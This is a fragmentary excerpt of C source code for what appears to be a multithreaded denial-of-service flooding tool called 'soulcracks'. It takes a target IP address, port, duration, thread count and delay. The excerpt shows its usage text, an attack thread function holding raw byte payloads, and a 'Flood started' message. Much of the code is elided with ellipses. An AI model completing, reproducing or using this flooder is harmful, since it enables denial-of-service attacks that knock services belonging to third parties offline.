...
void usage() {
    printf("Usage: ./soulcracks ip port time threads [delay_in_microseconds]\n");
    printf("Default delay: 1000 microseconds\n");
    exit(1);
}
...
void *attack(void *arg) {
    ...
    char *payloads[] = {
        ...
        "\x01\x00\x00", "\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00",
...
int main(int argc, char *argv[]) {
    ...
    int delay = (argc == 6) ? atoi(argv[5]) : 1000;

    pthread_t *thread_ids = malloc(threads * sizeof(pthread_t));

    printf("Flood started on %s:%d for %d seconds with %d threads and %d µs delay\n", ip, port, time, threads, delay);
